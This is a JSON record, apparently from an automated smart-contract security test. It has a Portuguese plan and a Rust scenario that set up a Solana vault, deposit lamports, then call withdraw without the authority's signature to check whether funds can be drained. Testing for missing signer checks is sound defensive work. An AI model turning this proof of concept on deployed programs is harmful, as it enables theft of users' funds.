{
  "plan": "O cenario inicializa um vault PDA com authority legitima e deposita lamports para dar saldo. O baseline chama withdraw com a authority assinando, provando que o cenario esta correto. O ataque repete a mesma chamada de withdraw, mas remove a assinatura da authority (marcando-a como nao-signer), mantendo o mesmo vault e recipient. O efeito mede se os lamports do vault diminuíram e os do recipient aumentaram sem a assinatura da autoridade.",
  "scenario": "let authority = Pubkey::new_unique();
let recipient = Pubkey::new_unique();
let (vault_pda, _bump) = Pubkey::find_program_address(&[b"vault", authority.as_ref()], &env.program_id);

let vault_data = anchor_account_data("Vault", &(authority, 0u64));
let vault_account = account(&env.program_id, &vault_data, None);
let authority_account = wallet(1_000_000_000);
let recipient_account = wallet(1_000_000_000);
let (system_program_id, system_program_account) = system_program_account();

let init_ix = env.anchor_ix(
    "initialize",
    &(),
    &[
        AccountMeta::new(vault_pda, false),
        AccountMeta::new(authority, true),
        AccountMeta::new_readonly(system_program_id, false),
    ],
);
let init_accounts = vec![
    (vault_pda, empty_account()),
    (authority, authority_account.clone()),
    (system_program_id, system_program_account.clone()),
];
let init_result = env.baseline("initialize vault", &init_ix, &init_accounts);

let mut vault_after_init = vault_account.clone();
for (key, acc) in &init_result.resulting_accounts {
    if *key == vault_pda {
        vault_after_init = acc.clone();
    }
}

let deposit_ix = env.anchor_ix(
    "deposit",
    &(500_000_000u64,),
    &[
        AccountMeta::new(vault_pda, false),
        AccountMeta::new(authority, true),
        AccountMeta::new_readonly(system_program_id, false),
    ],
);
let deposit_accounts = vec![
    (vault_pda, vault_after_init.clone()),
    (authority, authority_account.clone()),
    (system_program_id, system_program_account.clone()),
];
let deposit_result = env.baseline("deposit into vault", &deposit_ix, &deposit_accounts);

let mut vault_after_deposit = vault_after_init.clone();
for (key, acc) in &deposit_result.resulting_accounts {
    if *key == vault_pda {
        vault_after_deposit = acc.clone();
    }
}

let withdraw_ix = env.anchor_ix(
    "withdraw",
    &(100_000_000u64,),
    &[
        AccountMeta::new(vault_pda, false),
        AccountMeta::new_readonly(authority, false),
        AccountMeta::new(recipient, false),
    ],
);
let withdraw_accounts = vec![
    (vault_pda, vault_after_deposit.clone()),
    (authority, authority_account.clone()),
    (recipient, recipient_account.clone()),
];

let r = env.attack("withdraw without authority signature", &withdraw_ix, &withdraw_accounts);
if r.program_result == ProgramResult::Success {
    let vault_lamports_after = after(&r, &vault_pda).lamports();
    let recipient_lamports_after = after(&r, &recipient).lamports();
    env.effect(
        "vault lamports decreased and recipient lamports increased without authority signature",
        vault_lamports_after < vault_after_deposit.lamports()
            && recipient_lamports_after > recipient_account.lamports(),
    );
}"
}

